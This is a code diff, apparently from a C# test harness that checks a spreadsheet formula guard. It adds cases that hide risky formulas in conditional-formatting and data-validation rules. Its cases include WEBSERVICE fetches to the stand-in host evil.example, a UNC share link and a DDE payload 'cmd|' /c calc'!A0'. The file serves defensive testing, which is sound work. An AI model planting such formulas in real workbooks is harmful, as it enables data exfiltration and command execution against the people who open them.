@@ -135,6 +135,12 @@ internal static class Program
             ("a formula that fetches from the web", "xl/worksheets/sheet1.xml", was => was!.Replace("<sheetData>", "<sheetData><row r=\"900\"><c r=\"A900\"><f>WEBSERVICE(\"https://evil.example\")</f></c></row>")),
             ("a link to a file share", "xl/worksheets/sheet1.xml", was => was!.Replace("<sheetData>", "<sheetData><row r=\"900\"><c r=\"A900\"><f>HYPERLINK(\"\\\\evil.example\\share\",\"Open\")</f></c></row>")),
             ("a reference into another workbook", "xl/worksheets/sheet1.xml", was => was!.Replace("<sheetData>", "<sheetData><row r=\"900\"><c r=\"A900\"><f>[1]Sheet1!A1</f></c></row>")),
+            // Rule formulas, 9 Oct 2026: Excel evaluates these like cell formulas,
+            // and until then the guard read only <f> and definedName.
+            ("a web fetch in a colour rule", "xl/worksheets/sheet1.xml", was => was!.Replace("<pageMargins",
+                "<conditionalFormatting sqref=\"A900\"><cfRule type=\"expression\" priority=\"1\"><formula>WEBSERVICE(\"https://evil.example\")=\"\"</formula></cfRule></conditionalFormatting><pageMargins")),
+            ("a DDE formula in a dropdown rule", "xl/worksheets/sheet1.xml", was => was!.Replace("<pageMargins",
+                "<dataValidations count=\"1\"><dataValidation type=\"list\" sqref=\"A900\"><formula1>cmd|' /c calc'!A0</formula1></dataValidation></dataValidations><pageMargins")),
         ];
 
         foreach (var file in files)
